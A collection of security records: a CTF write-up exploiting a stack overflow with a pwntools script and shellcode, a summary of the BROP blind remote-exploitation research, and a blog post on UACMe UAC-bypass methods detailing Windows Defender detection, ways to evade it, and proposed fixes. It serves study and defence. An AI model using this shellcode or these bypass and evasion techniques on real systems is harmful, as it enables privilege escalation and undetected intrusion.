\u201cspecial\u201d in that\nregard. There has to be something wrong with people looking at\n(dis)assembly. Who knows\u2026\nI think one can only grow as a programmer when one occasionally lifts\nthe lid and has a look how things are really implemented. Curiosity is\npart of my job description as a researcher and leads to deeper\nunderstanding which I am happy to share with you. Until next time."}
{"text":"Let's take a look at the source code...\n\n```\n#include <stdio.h>\n#include <string.h>\n\nvoid nothing()\n{\n\tchar* buf0[50];\n\tprintf(\"%p\\n\", &buf0);\n\tgets(buf0);\n}\n\nint main()\n{\n\tprintf(\"Even if you do hack this elf, what are you going to do?. You should really get back to research.\\n\");\n\tnothing();\n}\n```\n\nSo we can see that it suffers from the same buffer overflow vulnerabillity as the rest. However unlike the previous levels, there isn't anywhere in here that will print out \"Level Cleared!\". So we will have to somehow pop a shell and read the \"out file\". What we can do, is we can push our own shellcode (shellcode is precompiled assembly code that you can push onto a program of the same architecture, and it should be able to run) onto the stack than overwrite the eip register to execute the shellocde. So essentially we will be writing code to the program, than executing that code. We can see that the elf prints out the address of the buffer, so that is one less thing we have to worry about. The first thing we will need is to find out how many characters we will have to write to reach the eip register.\n\n```\ngdb-peda$ disas nothing\nDump of assembler code for function nothing:\n   0x0804844b <+0>:\tpush   ebp\n   0x0804844c <+1>:\tmov    ebp,esp\n   0x0804844e <+3>:\tsub    esp,0xd8\n   0x08048454 <+9>:\tsub    esp,0x8\n   0x08048457 <+12>:\tlea    eax,[ebp-0xd0]\n   0x0804845d <+18>:\tpush   eax\n   0x0804845e <+19>:\tpush   0x8048540\n   0x08048463 <+24>:\tcall   0x8048300 <printf@plt>\n   0x08048468 <+29>:\tadd    esp,0x10\n   0x0804846b <+32>:\tsub    esp,0xc\n   0x0804846e <+35>:\tlea    eax,[ebp-0xd0]\n   0x08048474 <+41>:\tpush   eax\n   0x08048475 <+42>:\tcall   0x8048310 <gets@plt>\n   0x0804847a <+47>:\tadd    esp,0x10\n   0x0804847d <+50>:\tnop\n   0x0804847e <+51>:\tleave  \n   0x0804847f <+52>:\tret    \nEnd of assembler dump.\ngdb-peda$ b *nothing+47\nBreakpoint 1 at 0x804847a\ngdb-peda$ r\nStarting program: \/Hackery\/escape\/buf_ovf\/b4\/b4 \nEven if you do hack this elf, what are you going to do?. You should really get back to research.\n0xffffcf68\n0000\n```\n\nOne wall of text later...\n\n```\nBreakpoint 1, 0x0804847a in nothing ()\ngdb-peda$ x\/x $ebp-0xd0\n0xffffcf68:\t0x30303030\ngdb-peda$ info frame\nStack level 0, frame at 0xffffd040:\n eip = 0x804847a in nothing; saved eip = 0x80484a6\n called by frame at 0xffffd060\n Arglist at 0xffffd038, args: \n Locals at 0xffffd038, Previous frame's sp is 0xffffd040\n Saved registers:\n  ebp at 0xffffd038, eip at 0xffffd03c\n```\n\nSo we have the addess of the buffer (0xffffcf68) and the eip register (0xffffd03c). Now to find the distance we need to reach it.\n\n```\n>>> 0xffffd03c - 0xffffcf68\n212\n```\n\nSo we will have 212 bytes untill we reach the eip register. So we have the offset, and the address that we want to write to. The last thing we will need is the shellcode. For shellcode you can either write it yourself, or look it up online. I typically get my shellcode from this website.\n\nhttp:\/\/shell-storm.org\/shellcode\/\n\nand a link to the exact shell code I'm using for this exploit\n\nhttp:\/\/shell-storm.org\/shellcode\/files\/shellcode-597.php\n\nNow keep in mind, when you are picking\/writing your shellcode you have to have the same binary architecture. We are currently dealing with a 32 bit linux elf, so if you are picking shellcode from that website it should be under the Linux\/x86 category.\n\nNow that we have our shellcode, the address of the buffer, and the offset we can write our exploit. We will have to adjust the filler we use to reach the eip register to allow room for the shellcode. The shellcode I am using is 34 bytes long, so my filler will be 212-34 = 178 characters long. However this time I will actually write a python script instead of just a one liner. The reason for this is the address of the buffer will change under certain circumstances, so it is better to read it every time you run the exploit instead of just hardcoding it in. For this exploit I used pwntools, because it is a really big help and takes care of a lot of the hassle for me. Here is my exploit.\n\n```\n#Import the pwntools library.\nfrom pwn import *\n\n#The process is like an actualy command you run, so you will have to adjust the path if your exploit isn't in the same directory as the challenge.\ntarget = process(\".\/b4\")\n\n#Just receive the first line, which for our purposes isn't important.\ntarget.recvline()\n\n#Store the address of the buffer in a variable, and strip away the newline to prevent conversion issues\naddress = target.recvline().strip(\"\\n\")\n\n#Convert the string to a hexidecimal\naddress = int(address, 16)\n\n#Pack the hexidecimal in little endian for 32 bit systems\naddress = p32(address)\n\n#Store the shellcode in a variable\nshellcode = \"\\x6a\\x18\\x58\\xcd\\x80\\x50\\x50\\x5b\\x59\\x6a\\x46\\x58\\xcd\\x80\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x99\\x31\\xc9\\xb0\\x0b\\xcd\\x80\"\n\n#Make the filler to reach the eip register\nfiller = \"0\"*178\n\n#Craft the payload\npayload = shellcode + filler + address\n\n#Send the payload\ntarget.sendline(payload)\n\n#Drop into interactive mode so you can use the shell\ntarget.interactive()\n```\n\nNow let's try out the exploit...\n\n```\nguyinatuxedo@tux:\/Hackery\/escape\/buf_ovf\/b4$ python exploit.py \n[+] Starting local process '.\/b4': Done\n[*] Switching to interactive mode\n$ echo Is this working?\nIs this working?\n$ ls\nb4  b4.c  exploit.py  out\n$ cat out\nI see, you brough your own topics to research. Level Cleared!\n$ exit\n[*] Got EOF while reading in interactive\n$ exit\n[*] Process '.\/b4' stopped with exit code 0\n[*] Got EOF while sending in interactive\nguyinatuxedo@tux:\/Hackery\/escape\/buf_ovf\/b4$ \n```\n\nAnd just like that, we pwned the binary. Now let's fix it.\n\n```\n#include <stdio.h>\n#include <string.h>\n\nvoid nothing()\n{\n\tchar* buf0[50];\n\tprintf(\"%p\\n\", &buf0);\n\tfgets(*buf0, sizeof(*buf0), stdin);\n}\n\nint main()\n{\n\tprintf(\"Even if you do hack this elf, what are you going to do?. You should really get back to research.\\n\");\n\tnothing();\n}\n```\n\nLet's test it...\n\n```\nguyinatuxedo@tux:\/Hackery\/escape\/buf_ovf\/b4$ python -c 'print \"0\"*400' | .\/b4_secure \nEven if you do hack this elf, what are you going to do?. You should really get back to research.\n0xffffcf78\nguyinatuxedo@tux:\/Hackery\/escape\/buf_ovf\/b4$ \n```\n\nJust like that, we patched the binary.\n"}
{"text":"Blind Return Oriented Programming (BROP)\nWhen hacking software, there are three exploit scenarios:\n1. Open-source (e.g., Apache)\n2. Open-binary (e.g., Internet Explorer)\n3. Closed-binary and source (e.g., some proprietary network service)\nThis work studies whether it is possible to attack the third case.\nThe BROP attack makes it possible to write exploits without possessing\nthe target's binary. It requires a stack overflow and a service that\nrestarts after a crash. Based on whether a service crashes or not\n(i.e., connection closes or stays open), the BROP attack is able to\nconstruct a full remote exploit that leads to a shell. The BROP attack\nremotely leaks enough gadgets to perform the write system call, after\nwhich the binary is transferred from memory to the attacker's socket.\nFollowing that, a standard ROP attack can be carried out. Apart from\nattacking proprietary services, BROP is very useful in targeting\nopen-source software for which the particular binary used is not public\n(e.g., installed from source setups, Gentoo boxes, etc.).\nThe attack completes within 4,000 requests (within minutes) when tested\nagainst a toy proprietary service, and real vulnerabilities in nginx\nand MySQL.\nThe fundamental problem sometimes seen in servers is that they fork a\nnew worker process after a crash, without any rerandomization (e.g., no\nexecve follows the fork). nginx for example does this.\nThe paper describing the work is:\n* A. Bittau, A. Belay, A. Mashtizadeh, D. Mazi\u00e8res, D. Boneh:\n[1]Hacking Blind. In Oakland 2014. [[2]slides]\nAttack outline\n1. Break ASLR by \"stack reading\" a return address (and canaries).\n2. Find a \"stop gadget\" which halts ROP chains so that other gadgets\ncan be found.\n3. Find the BROP gadget which lets you control the first two arguments\nof calls.\n4. Find a call to strcmp, which as a side effect sets the third\nargument to calls (e.g., write length) to a value greater than\nzero.\n5. Find a call to write.\n6. Write the binary from memory to the socket.\n7. Dump the symbol table from the downloaded binary to find calls to\ndup2, execve, and build shellcode.\nDownloads\n[3]Braille\nA fully automated tool that conducts a BROP attack (from crash\nto remote shell) when supplied with an input string that crashes\na server due to a stack overflow.\n[4]Optimized nginx BROP exploit\nA generic 64-bit exploit for nginx 1.4.0 that uses BROP,\noptimized for nginx's case. This also includes an IP\nfragmentation router to make the attack possible on WANs. nginx\ndoes a non-blocking read on a 4096 byte buffer, and typical MTUs\nare 1500, so IP fragmentation is needed to deliver a large TCP\nsegment that will result in a single read of over 4096 bytes.\n[5]Ali's server\nThe toy proprietary service written by a colleague used as a\ntest case in the paper for hacking without neither binary nor\nsource code knowledge."}
{"text":"#[1]The Vault - Atom [2]The Vault - RSS [3]The Vault - Atom\n[4]The Vault\nMonday, October 5, 2020\nUACMe 3.5, WD and the ways of mitigation\nIntro\n(warning this post if quite long)\nUACMe is a demonstrator tool initially developed following WinNT\/Pitou\nresearch. It contains set of User Account Control (UAC) bypass methods,\nwhere most of them initially extracted from ITW malware.\n[5][Untitled.png]\nPic 1. Typical UAC window (IFileOperation).\nMore about UACMe and Microsoft way of fixing \"not a security boundary\"\n(and side effects of these fixes) you can read at kernelmode.info\n[6]archive. Since initial release in the December 2014 a total number\nof added UAC bypass methods counted 63. It maybe astonishing number at\nfirst glance but keep in mind that around ~20% of these methods are\ncombinations of each other, any change made by Microsoft to fix\ndesignated method will ruin not only this method but also automatically\neverything where it was used. A perfect example is methods based on\nISecurityEditor undocumented autoelevated interface used by Win32\/Simda\n(previously wide-spread malware family with Russian origin). When\nMicrosoft altered this interface forcing it to work only with file\nobjects this ruined not only original Simda method but also method that\nused Application Verifier dll planting (later this method was also used\nin some ITW malware). However this does not mean UACMe doesn't have\nmeasures against these fixes where they are available. Several methods\nhave different ways of execution depending on current Windows version\nwhere they expect original implementation to be fixed or unavailable by\ndifferent reasons. Anyway - don't take UACMe methods counter as an\nindicator of anything.\nWith these number of methods codebase has ridiculously grown and\nbecause it late 2020 it was decided to drop everything that does not\nwork or have been fixed on current mainstream Windows version.\nMicrosoft fixes to UAC, while there are plenty of them, almost never\nbeen backported to previous Windows versions. Only exceptions are:\ngeneric fuckup in media (like in case of some APT causing MS drop UAC\nfix as part of their bulletin) or as part of big rollup update (Windows\n7). Just keep in mind that UAC become \"not a security boundary\" when it\nwas fucked up by Microsoft marketing specialists with Windows Vista.\nCurrently Windows 10 pushing major updates 1-2 times per year. As for\nnow, Windows 7 and 8\/8.1 out of the box settings render their UAC\nalmost transparent to threats due to fundamental design flaws revealed\nin the UAC implementation over time. Not surprisingly all methods that\nbound on Windows 7 are dropped in UACMe 3.5+. It is time to move on.\nThe last major UAC update in Windows 10 was in RS1 release (14393)\nwhere they massively updated appinfo (UAC service with implementation\ninside appinfo.dll) and reviewed several other things. Since that time\nthey released only some sporadic updates targeting some specific\nmethods. However this does not mean they do nothing. Not at all.\nWindows Defender to the rescue\nThis Microsoft aggressively imposed \"product\" that ships with Windows\n10 (now even Server) and it general purposes are:\n1. Massively affect PC performance;\n2. Imitate protection from threats by detecting open source projects,\ncollections of out-dated malware and various script-kiddie junk;\n3. Have an option to work as selective backdoor (hello Kaspersky GRU\nmode \ud83d\ude40);\n4. Take a share on AV global market.\nWindows Defender is the thing you don't need at all. At least if you\ncapable of being a master of your PC not slave of it installed program.\nFortunately, despite the Microsoft attempts to harden WD presence, you\nstill can remove it completely from system without side effects.\nRegarding to UACMe Windows Defender works as \"that guy\" who is fixing\nwhat OS devs doesn't want to fix. Yes, they selectively and very\ncarefully signatured lots of unfixed UAC bypass methods and UACMe\nprogram and it components. However even there MS for some unknown\nreason leaving wide open window for malware constantly ignoring a very\npopular methods used ITW and at the same time detecting some of really\nrare (if even used). On the other side WD installed and updated on\nsystems that has no fancy UAC fixes built-in so it working as the only\navailable lazy fix here \ud83d\ude09\nHow does it detect it? Windows Defender has a real-time behavior\nmonitoring feature that can catch system events by a bunch of kernel\nmode filters and callbacks (most of them inside WDFilter.sys driver). A\nuser mode client subscribed to these events and judging on their\ncombinations can predict program behavior thus giving WD ability to\ncheck it against set of rules stored in the signatures called\n\"Behavior\" in their AV database. There are hundreds of such rules in\ntheir database and this number always grows. And of course they have a\nlot of them regarding possible UAC bypasses.\nExamples of such behavior detection:\nThe filter reports registry write at specific key which is hardcoded in\nthe WD database. Some program want to change @Default value of current\nlogged user Software\\Classess\\mscfile\\shell\\open\\command key.\nDeterminate a caller application (if it is an indirect registry write -\nattempt to locate its initiator). Revert registry change, remediation -\ncheck and kill initiator, notify user through message balloon, write\nlogs, quarantine the initiator, if required. Take a hint, this is all\ndone in real-time, involving a lot of highly ineffective code, with a\nrace condition state so if system lags a lot WD actually can miss the\nmoment when initiator effectively launch payload and despite achtung\nballoon UAC bypass will \"pass\".\n[7][Untitled.png]\nPic 2. Windows Defender detection with behavior signature (nothing\nquarantined, its just a WD bullshit).\nAnother example of same kind. We have same registry write event, but\nour detection rule is more complicated. Now we also check if there is a\nspecific process launch registered - sdclt.exe (Microsoft binary). If\nso, we are looking for its parameter (it can't be obfuscated as we\ndoesn't control sdclt.exe behavior this way). If this parameter is\n\/kickoffelev - bingo, you got a balloon \"Threat detected\nBehavior:Win32\/UacBypassExp.K!sdclt\"\nEt cetera. There are more than 40 behavior detection signatures\ntargeting UAC bypass attempts at the moment of this writing and this\ncount will highly likely increase. Some of them giving cross detection\ncapabilities.\nDoes this effective enough? It depends on how much space for maneuver\nthe particular method has. If you out of space and different approach\nis impossible - WD have won.\nHowever, you should not overestimate WD team capabilities. While they\nare indeed carefully signatured some of the known methods and\ncombinations in various malware, they are doing this in a way missing\nany creativity in mind. Or maybe they are incapable of it. So if the\nmethod is still technically working on latest Windows 10 and WD has\nbehavior signature for it - it is highly likely we can bypass it by\naltering method in a way WD does not expect it to work.\nBelow we will take a tour to the UACMe 3.5 remaining methods, figure\nout how they can be fixed from OS dev point of view and how WD can be\nimproved to block them completely as \"lazy way fix\".\nUAC Bypass Exploits\nEverything below tested against full patch Windows 10 (2004), clean\ninstall with default settings and fully updated Windows Defender as of\n26 September 2020.\n\ud83d\udca5Method #22\n(herein and below numbers are method ids in UACMe list).\n1) Description\nThis is a dll hijacking method based on internal Windows dll\nredirection feature called DotLocal (or .local) and relying on\nIFileOperation autoelevated interface to plant payload files\/create\nrequired subdirectories structure inside Windows system32 protected\ndirectory. It is similar to #21 with different target application, in\nthat case it is consent.exe - this thing is responsible for UAC\ncredentials dialog and launched every time when you start anything that\nrequire an elevation (even if it is has autoelevation capabilities).\nExcept providing GUI for UAC this program also responsible for checking\nautoelevated interfaces to be in special whitelist introduced in the\nWindows 10 RS1 and called COMAutoApprovalList. If checked interface is\nnot in this list it won't be elevated. UACMe creates a required\nsubdirectory structure in system32 and plants it special module called\nFubuki under name comctrl32.dll. Next when consent.exe started this dll\nloads into consent address space as common controls library, executes\npayload and terminate consent. Resulting payload will run with\nLocalSystem (NT Authority\\SYSTEM) account rights because consent.exe\nspawned from UAC service that also runs as LocalSystem.\n2) WD detection\nMicrosoft has a behavior signatures for this method. Their idea here is\nto catch the moment when you create subdirectories for planting payload\nand moment when attacker code moves payload from temporary folder to\nthe target subdirectory in system32. This is strange and incomplete\ndetection as it doesn't cover different scenario when nothing moves\nanywhere and there is a direct write to this directory from memory.\n3) WD detection bypass\nSince IFileOperation creates an admin owned directories in system32 we\ncan abuse that fact, create subdirectories as usual and then reset DACL\nfor final subdirectory to allow us write access without elevation. This\ncan be achieved by combing IFileOperation with ISecurityEditor which\nhas been a subject of incomplete fix after Win32\/Simda where MS banned\nit usage for anything else than file objects, previously it was nice\nautoelevated Set\/GetNamedSecurityInfo wrapper.\n4) Lazy fix for WD\nObviously you must catch a moment when a file is created inside this\nDotLocal subdirectory structure. However this can be not enough, as\nattacker code can use renaming operation, so better solution will be\ncatch both cases and if there is ANY file present (or there is an\nattempt to write here) in this DotLocal substructure show detect. It is\na bit more complicated then what they actually have.\n5) Possible fix\nWhen consent.exe started by appinfo service it maybe be started with\nprocess mitigation binary policy \"Microsoft Signed Only\" applied. This\neven won't require any IFEO keys etc. I've no idea why they didn't\nbothered to implement this from the beginning. This is especially fun\nbecause #21 targeting sysprep.exe was fixed by MS in that way.\n\ud83d\udca5Method #23\n1) Description\nThis is dll hijacking method based on fact that PkgMgr.exe (whitelisted\nby UAC service in g_lpAutoApproveEXEList internal list) is being\ndeprecated and works just as launcher for Dism application which is\nlocated in system32 subdirectory \"Dism\". When the Dism application has\nstarted, it will search for its dependencies in the system32 as first,\nthen from its home directory. Attacker can plant a payload dll as\ndismcore.dll to the system32 and then trigger Dism launch by calling\nPkgMgr.exe with special parameters.\n2) WD detection\nWindows Defender has several signatures to detect this, their exact\ndedicated signature called Win32\/Disemer and has several variants. They\ndetect it by various things - starting from dismcore.dll file in the\nsystem32 (which indeed achtung and red alert as it never happens on\nreal system), and ending up with pkgmgr.exe parameters containing\nspecific tokens.\n3) WD detection bypass\nFirst of all, since I was this one who made this method public I'm\nquite surprised that for a few years of it existence no one actually\nlook on it deeper. It seems both malware and AV industry blindly\nadapted what was posted on [8]kernelmode.info. If we can trust\ncrowdstrike (dubious security company sometimes serving as a proxy in\nWest info wars campaigns) - even some \"APT\" used it as is. Actually you\ncan do this bypass in a different way. There is no need in any\nadditional files (packages) to be dropped anywhere and supplied as\nparameter to pkgmgr. You can just give it complete junk and use\nsomething else not only dismcore.dll. However this method has not so\nmuch space for maneuvering and can be completely signatured.\n4) Lazy fix for WD\nPkgmr execution with ANY parameters following executable code planting\nas file in the system32.\n5) Possible fix\nRemove deprecated PkgMgr.exe from appinfo g_lpAutoApproveEXEList. There\nis no sense in keeping it here. Instead, PkgMgr may have manifest with\nrequested execution level set to \"requireAdministrator\" and\nautoelevation blocked or unspecified.\n\ud83d\udca5Method #30\n1) Description\nStrictly speaking this is not a true dll hijack, it is more like\nabusing undocumented feature where this it seems completely for\ninternal debugging. Method based on Wow64 subsystem logger dll. The\nfirst public mention about this Wow64 mechanics has been posted more\nthan 10 years ago by lhc645 [9]here. There also was posted wow64log dll\nsource skeleton. The target dll - wow64log.dll must be placed to the\nsystem32 folder. Every wow64 application when started will load it and\nexecute dll entry point, thus you can inject this dll to the\nautoelevated binaries from syswow64 folder. The logger dll must be\nnative otherwise there will be a crash in the target application. This\nmethod has a lot of disadvantages and not that much room to maneuver in\ncase of active counteraction from WD. UACMe uses IFileOperation to\nplant module named Akatsuki - payload dll as wow64log.dll in the\nsystem32 folder. This dll is not native and this is done on a purpose.\nWhen target application attempts to load this dll it will crash causing\nlaunch of WerFault application which is also will be 32 bit but started\nas LocalSystem. Thus Akatsuki will propagate to WerFault instance(s)\nand grant payload code NT Authority\\SYSTEM access rights.\n2) WD detection\nNot capable (as of 26 Sep 2020).\n3) WD detection bypass\nNo needed, see above.\n4) Lazy fix for WD\nBlock wow64log.dll loading by default.\n5) Possible fix\nBlock wow64log feature by checking corresponding registry value (lets\nsay REG_DWORD \"EnableWow64Logging\") somewhere in HKLM with default\nstate set to FALSE(0).\n\ud83d\udca5Method #32\n1) Description\nThis method implements UAC bypass by window hook set from dll hijacked\nUIAccess application. As target it abused OSK.exe copied from Windows\nfolder to the %ProgramFiles%\\Windows Media Player folder (created if\nnot exist) with help of IFileOperation. This is done for creating\nconditions required for dll hijack. Target directory selected because\nit is inside appinfo g_lpIncludePFDirs secure directories whitelist.\nNext Fubuki planted in the same folder as duser.dll or osksupport.dll\ndepending on Windows version. When OSK.exe starts - variant of this dll\nloaded and Fubuki code runs on Medium+ integrity level from UIAccess\nallowed application which enables it dll injection via windows hooks.\nAs target of final injection it uses eventvwr.exe launcher application.\n2) WD detection\nNot capable (as of 26 Sep 2020).\n3) WD detection bypass\nNo needed, see above.\n4) Lazy fix for WD\nEasiest and obvious - block dlls planting by folder and name. However\nthere can be different targets and dlls. Ultimate solution would be\npreventing dll injection at final stage to the high IL process from\nMedium+ IL as it clearly not something you can expect from such\nUIAccess applications.\n5) Possible fix\nUIAccess applications should include manifest with hardened loadFrom\nelements thus preventing dll hijacking as dll dependencies that are not\nin KnownDlls will be loaded from manifest specified paths. Microsoft\ndid this in the past with Sysprep.exe (unfortunately this was\nincomplete fix and it took them few more years to finally harden\nsysprep from dll hijacking) and for inetmgr.exe.\n[10][Untitled.png]\nPic 3. Sysprep.exe manifest as example.\n\ud83d\udca5Method #33 (#62)\n1) Description\nThis is a registry key manipulation type bypass. It is similar to\ninfamous Enigma0x3 \"mscfile fileless\" bypass and the only difference in\na key and target application. It abuses fact that Windows Shell will\nfirst lookup given class items in the current user registry hive and\nonly after that in local machine. Thus you can control key that later\nWindows will attempt to parse and execute command from it. Method 33\nand 62 has the same code base in UACMe, the only difference is the\ntarget applications they involve. It was requested by some of the UACMe\nusers and I didn't mind to fulfill that request.\n2) WD detection\nBecause this is similar to Enigma0x3 methods and widely used ITW by\nmalware Windows Defender has behavior detection signature\nBehavior:Win32\/UACBypassExp.T (with variants). Part of rule including\nwrite event to the current user\nSoftware\\Classes\\ms-settings\\shell\\open\\command @Default value and\nfollowing process execution (fodhelper.exe or computerdefaults.exe -\nboth are Microsoft binaries).\n3) WD detection bypass\nWindows Defender capable of detecting write event to the hardcoded\nregistry key either direct or indirect using for example reg.exe or\nPowershell. In fact it doesn't matter, it will detect all writes,\nindirect write through registry symbolic link or registry transaction.\nIt detects \ud83d\ude09\nHow this can be bypassed? We will use the fact that WD is:\nA) incapable prevent registry key creation and B) only inspect @Default\nvalue change of the last key in the registry path chain.\nOur goal is to redirect key read for Windows Shell from WD inspected\nkey to our fake key with all planted data. To do this we will set\nregistry symbolic link to the \"command\" registry key in path chain and\nredirect it to our controlled \"command\" key somewhere else. WD will\nread original key and will be happy as it will have the same unmodified\n@Default value. Windows Shell will reparse registry key when accessing\n\"command\" and will read data from \"our\" key instead. Everybody happy.\n4) Lazy fix for WD\nBlock symbolic link creation for entire registry entry elements, or\nfollow symbolic link and inspect resulting key instead of just reading\nhardcoded one ignoring reparse. More hardcore solution would be is to\nblock write access at all to these shell keys.\n5) Possible fix\nCreate default empty keys for users and protect them with security\ndescriptor. Windows Shell is over-complicated bullshit so there can be\nside effects and this require more investigations which is simpler to\ndo when you have all source code.\n\ud83d\udca5Method #34\n1) Description\nThis is AlwaysNofity compatible method. It abuses environment variables\nand Microsoft DiskCleanup scheduled task. The idea behind this method\nis to set your own controlled %windir% environment variable to the\nregistry and then force scheduled task take it resulting in command\nline injection. Quotes for payload command are required part here as\nthey need for successful command line injection since executable path\nin scheduled task is not quoted.\n2) WD detection\nIt detects the fact of scheduled task startup and does this by\ncomparing command line of schtaks.exe to have\n\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup substring. If found - then\nachtung you got Behavior:Win32\/SilentCleanupUACBypass\nNote they also prepared for possible other sources - this signature\nspeaks for itself PossibleSchedTasksUACBypass (checks for\n\\Microsoft\\Windows sub-string).\n3) WD detection bypass\nJust don't use schtasks. No one actually forced you to do so. This\nmethod is perfect illustration when everybody just simple copy-pasted\noriginal. You can do the same what schtasks does with help of Task\nScheduler interface objects such as ITaskService, ITaskFolder and\nIRegisteredTask.\n4) Lazy fix for WD\nDetect %windir% environment variable modification for current user.\n5) Possible fix\nGet rid of environment variables for DiskCleanup scheduled task or use\nquoted path. That %windir% actually was a ridiculous idea.\n\ud83d\udca5Method #36\n1) Description\nThis method is from infamous SandboxEscaper from those times when he\nwas not yet what he(she\/it whatever) is now. Like almost everything\nfrom this guy it is based on NTFS reparse point feature and state of\nrace condition. It abuses Wusa behavior which creates hidden temporary\ndirectory in the root of the current drive with default security\ndescriptor when processing msu (cab) files. Wusa extracts contents of\nprocessed cab file to that temporary directory looking for further\ninstructions inside these files. By setting reparse point on that\ndirectory you can redirect Wusa write to specified target directory.\n2) WD detection\nThere is no specific detection signature for this method. However since\none variant of it uses Dism hijack similar to method #23 WD detects\nfile planting to the system32 folder with Win32\/Disemer signature.\n3) WD detection bypass\nSimilar to #23\n4) Lazy fix for WD\nSimilar to #23\n5) Possible fix\nWusa should set security descriptor when creating temporary directory.\nSomething like similar fix has been implemented for method #26 by MS in\nthe past.\n\ud83d\udca5Method #37\n1) Description\nIt is combination of DotLocal, Wusa race condition methods (#21, #22,\n#36). It uses Wusa race condition to create DotLocal directory\nstructure and copy file to the system32. Instead of comctrl32 it abuses\nGdiPlus with target set to DCCW.exe\n2) WD detection\nNot capable (as of 26 Sep 2020).\n3) WD detection bypass\nNo needed, see above.\n4) Lazy fix for WD\nSimilar to #22 and #36\n5) Possible fix\nDccw.exe autoelevation removal.\n\ud83d\udca5Method #38\n1) Description\nThis method uses appinfo command line parsing spoofing. This requires\ntalking to appinfo via RPC as Windows Shell always build correct\ncommand line request when used ShellExecute(Ex). This can be achieved\nthrough AicLaunchAdminProcess hook or by direct RPC call. You have to\nprepare your MMC snap-in and embed in it Shockwave Flash Object which\nwill execute supplied HTML script located somewhere on disk. This HTML\ncode will eventually run your payload through ExecuteShellCommand\nmethod.\n2) WD detection\nNot capable (as of 26 Sep 2020).\n3) WD detection bypass\nNo needed, see above.\n4) Lazy fix for WD\nThis method require file drops. Both fake management console snap-in\nand html run script can be detected when dropped to the disk. However\nthis is not really reliable. Perhaps you can catch the moment when\nmmc.exe got started with fake snap-in.\n5) Possible fix\nObviously appinfo command line parsing need a tweak so it won't skip\narguments in command line without actual check of them.\n\ud83d\udca5Method #39\n1) Description\nThis is NET Code Profiler method. It entirely rely on setting very\nspecific current user environment variables and registering fake\nprofiler dll which must be dropped to the disk. Then you must select\ndotnet origin target. In our case it is EventViewer GUI - slow &\nridiculously over complicated piece of crap.\n2) WD detection\nNot capable (as of 26 Sep 2020).\n3) WD detection bypass\nNo needed, see above.\n4) Lazy fix for WD\nCan be entirely prevented by WD inspecting environment variables\nregarding CorPofiler path.\n5) Possible fix\nmmc.exe should not allow loading of non Microsoft binaries in it\naddress space when run with High IL.\n\ud83d\udca5Method #41\n1) Description\nBased on ICMLuaUtil autoelevated COM interface which provides a set of\nmethods that can be used to bypass UAC. It allows running arbitrary\nexecutable with High IL, deleting and setting arbitrary registry\nentries with elevation and more.\n2) WD detection\nWD has multiple behavior signatures for initially presented script\nbased attacks, for example: Behavior:Win32\/CICmstp,\nBehavior:Win32\/UacCmstp, Behavior:Win32\/SuspParentLaunchingLOLBin,\nBehavior:Win32\/CmstpSuspParent and variants of them. Unfortunately they\nare completely incapable of preventing this method when it used as it\nshould be. They only signatured script-kiddie junk. Why is that read\nnext. Meanwhile this method is somewhat popular in malware because of\nit simplicity in raw mode.\n3) WD detection bypass\nNo needed.\n4) Lazy fix for WD\nThis interface is a backdoor by design. It is fully controllable by\nattacker with attacker defined components and huge space for maneuver.\nIt is hard to trace behavior as it can be various and unpredictable.\nYou can however trace when this interface used for legitimate purposes,\nlog it behavior and compare this trace with occurred event. It doesn't\nlook very reliable however.\n5) Possible fix\nRemove this interface from COMAutoApprovalList. This will force UAC to\nshow dialog each time this interface called.\n\ud83d\udca5Method #43\n1) Description\nThis method is a combination of #41 which is used to write arbitrary\ndata to the Windows Registry and another undocumented autoelevated\ninterface called\nIColorDataProxy. Main idea here - write custom calibrator setting to\nthe HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\Calibration\n@DisplayCalibrator and then run it by calling autoelevated\nIColorDataProxy interface method LaunchDccw. Interface will read custom\ncalibrator value and start this program via ShellExecuteEx call doing\nthat on High IL.\n2) WD detection\nNot capable (as of 26 Sep 2020).\n3) WD detection bypass\nNo needed.\n4) Lazy fix for WD\nDetect write to HKLM\\Software\\Microsoft\\Windows\nNT\\CurrentVersion\\ICM\\Calibration at value @DisplayCalibrator. May\ncause problems if this feature used somewhere legitimately.\n5) Possible fix\nThis won't work without writing to the registry which is provided by\nICMLuaUtil interface. Removing it from COMAutoApprovalList will\nautomatically block this method too.\n\ud83d\udca5Method #52\n1) Description\nThis method currently popular ITW because of it simplicity so even zero\nskill malware authors may embed it to their elite dotnet droppers. Idea\nbehind it is to abuse appinfo design flaw where Win32 API\nGetLongPathName due to it specific is converting supplied fake security\ndirectory path to the real one thus passing further internal check\nagainst secured directories whitelist. There at least two variants of\nthese method used ITW - original and my - involving reparse points,\nexactly it is used by WastedLocker ransomware. They mostly copy-pasted\nit as is from UACMe with their set of ridiculous additions.\n2) WD detection\nNot capable (as of 26 Sep 2020).\n3) WD detection bypass\nNo needed.\n4) Lazy fix for WD\nDetect directory creation, mount point creation. It should not be that\nhard as this method require trusted directory name abuse.\n5) Possible fix\nThis needs to be patched in appinfo. Get rid of Win32 API when\nconverting file path. It is ridiculous combination having Win32 API\npath conversion for path check.\n\ud83d\udca5Method #53\n1) Description\nThis method is similar to #33. The only difference is the target key\nand application. Target key here is\nHKCU\\Software\\Classes\\Folder\\shell\\open\\command @Default value\n(+DeletegateExecute as usual) and trigger is sdclt.exe\n2) WD detection\nWD is capable to detect this. Dedicated signatures named\nBehavior:Win32\/UACBypassExp.F!sdclt(2)(3)(4)(src). Writing (direct or\nindirect) to that key default value triggers detection.\n3) WD detection bypass\nSimilar to #33\n4) Lazy fix for WD\n#Similar to #33\n5) Possible fix\n#Similar to #33\n\ud83d\udca5Method #55\n1) Description\nIt is UIPI bypass with UIAccess application primary token duplication.\nDuplicated token next modified to have Medium IL and used to create\nsecond stage process. Because this process created with token that has\nUIAccess flag set this process will be able to circumvent UIPI. As\nsecond stage process UACMe uses Fubuki unit modified in the runtime to\nbe standalone executable. When started Fubuki will spawn msconfig.exe\nat Tools page. Next it will identify ListView window and use SendInput\nAPI to navigate to the \"cmd.exe\" entry in the tools list and simulate\nbutton click. After that it will wait for console window and type\nspecified command to it running actual payload. This is a complex\nmethod that is not really reliable in the real life and was added just\nfor fun as I really liked the concept.\n2) WD detection\nNot capable (as of 26 Sep 2020).\n3) WD detection bypass\nNo needed.\n4) Lazy fix for WD\nI would detect all kind of Medium IL processes running with UIAccess\nflag set as malicious just because it against Windows behavior 